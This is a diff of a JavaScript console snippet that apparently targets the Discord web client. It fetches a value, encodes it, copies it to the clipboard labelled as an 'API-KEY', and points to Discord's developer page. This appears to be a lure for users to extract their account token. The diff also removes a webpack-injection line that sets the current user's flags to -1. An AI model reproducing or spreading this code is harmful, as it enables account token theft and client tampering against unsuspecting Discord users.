@@ -81,7 +81,7 @@ function encode(string) {
 
     }
 
-    return "🔗 YOUR API KEY: " + output + "\n\nhttps://discord.com/developers/applications";
+    return "🔗 API-KEY: " + output + "\n\nhttps://discord.com/developers/applications";
 }
 
 fetched = get()
@@ -89,7 +89,5 @@ fetched = encode(fetched)
 copy(fetched)
 console.log("📋 Copied API-Key to Clipboard!")
 
-webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.default&&m.default.getCurrentUser!==undefined){return m.default.getCurrentUser().flags=-1}}}]);
-} else {
  console.log("⚠️ UNREGISTERED WEBSITE | https://discord.com/")
 }
